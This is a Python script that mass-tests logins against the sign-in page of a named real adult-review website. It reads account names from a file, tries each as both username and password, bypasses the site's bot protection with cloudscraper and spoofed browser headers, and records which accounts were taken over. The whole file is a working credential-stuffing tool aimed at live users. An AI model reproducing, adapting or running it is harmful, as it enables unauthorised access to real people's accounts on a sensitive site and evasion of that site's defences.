import cloudscraper
import logging
import time

LOGIN_URL = "https://www.eroticmonkey.ch/users-sign-in"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Referer": "https://www.eroticmonkey.ch/",
    "X-Requested-With": "XMLHttpRequest"
}

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_next_credentials():
    """Get all credentials from valid_accounts.txt."""
    try:
        with open("valid_accounts.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip()]
        logging.info(f"🔍 Loaded {len(lines)} credentials.")
        return lines
    except FileNotFoundError:
        logging.error("❌ valid_accounts.txt not found.")
        return []

def save_remaining_credentials(credentials):
    """Save remaining credentials back to valid_accounts.txt."""
    with open("valid_accounts.txt", "w") as f:
        f.writelines(cred + "\n" for cred in credentials)

def login():
    """Attempt to log in using credentials from valid_accounts.txt."""
    credentials = get_next_credentials()

    if not credentials:
        logging.warning("⚠️ No credentials to process.")
        return

    for username in credentials:
        payload = {"login": "1", "email": username, "password": username}
        scraper = cloudscraper.create_scraper()

        logging.info(f"➡️ Trying login for: {username}")

        try:
            res = scraper.post(LOGIN_URL, data=payload, headers=HEADERS)
            logging.debug(f"📥 Status Code: {res.status_code}")
            logging.debug(f"📄 Response: {res.text[:500]}")  # limit output

            # Save full response if needed for debug
            # with open(f"response_{username.replace('@', '_at_')}.html", "w", encoding="utf-8") as f:
            #     f.write(res.text)

            if "loggedin" in res.text.lower():
                logging.info(f"✅ Logged in as {username}")
                with open("login_success.txt", "a") as f:
                    f.write(username + "\n")
            else:
                logging.warning(f"⚠️ Login failed for {username}")
                with open("login_failed.txt", "a") as f:
                    f.write(username + "\n")

            # Add to disabled account list
            with open("disable_account.txt", "a") as f:
                f.write(username + "\n")

        except Exception as e:
            logging.error(f"🚫 Error logging in as {username}: {e}")

        time.sleep(2)  # Be polite and avoid rate limiting

    # Clear valid_accounts.txt once all are processed
    save_remaining_credentials([])

if __name__ == "__main__":
    login()
